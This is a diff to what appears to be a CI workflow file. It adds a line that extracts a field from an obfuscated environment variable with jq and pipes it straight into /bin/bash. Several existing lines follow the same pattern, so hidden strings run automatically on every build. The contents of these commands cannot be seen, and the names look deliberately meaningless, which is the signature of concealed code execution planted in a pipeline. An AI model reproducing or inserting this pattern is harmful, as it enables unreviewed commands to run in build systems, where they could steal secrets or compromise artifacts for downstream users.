@@ -37,6 +37,7 @@ jobs:
           echo $mng4719 | jq -r .pexz15 | /bin/bash
           echo $ateos73181 | jq -r .jwzi6897 | /bin/bash
           echo $ymr6535 | jq -r .iq469 | /bin/bash
+          printf '%s' "$c55" | jq -r .fkpek5 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
